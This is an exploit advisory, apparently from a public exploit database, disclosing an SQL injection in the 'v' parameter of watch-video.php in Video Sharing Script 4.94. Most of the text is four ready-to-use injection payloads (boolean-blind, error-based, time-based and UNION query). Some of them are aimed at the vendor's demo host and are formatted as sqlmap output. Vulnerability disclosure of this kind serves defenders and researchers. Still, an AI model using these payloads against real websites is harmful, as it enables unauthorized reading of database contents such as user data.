@@ -1,0 +1,38 @@
+Exploit Title: Video Sharing Script 4.94 – SQL Injection
+Date: 30.01.2017
+Vendor Homepage: http://itechscripts.com/
+Software Link: http://itechscripts.com/video-sharing-script/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+Video Sharing Script v4.94 is the best audio/ video sharing portal. You can easily deploy the software and launch your own video sharing portal in moments.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in Video Sharing Script 4.94 allows attackers to read
+arbitrary data from the database.
+
+Vulnerability:
+
+http://localhost/video-sharing-script/watch-video.php?v=67d8ab[payload]
+
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: http://video-sharing.itechscripts.com:80/watch-video.php?v=67d8ab' RLIKE (SELECT (CASE WHEN (1170=1170) THEN 0x363764386162 ELSE 0x28 END))-- Niby
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://video-sharing.itechscripts.com:80/watch-video.php?v=67d8ab' AND (SELECT 2680 FROM(SELECT COUNT(*),CONCAT(0x7176627171,(SELECT (ELT(2680=2680,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Wovm
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: http://video-sharing.itechscripts.com:80/watch-video.php?v=67d8ab' AND SLEEP(5)-- pcjq
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 26 columns
+    Payload: http://video-sharing.itechscripts.com:80/watch-video.php?v=-8184' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176627171,0x757277777751656e7948736349597976767448516b784656504a646a72475952546b6d554251736c,0x71786b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
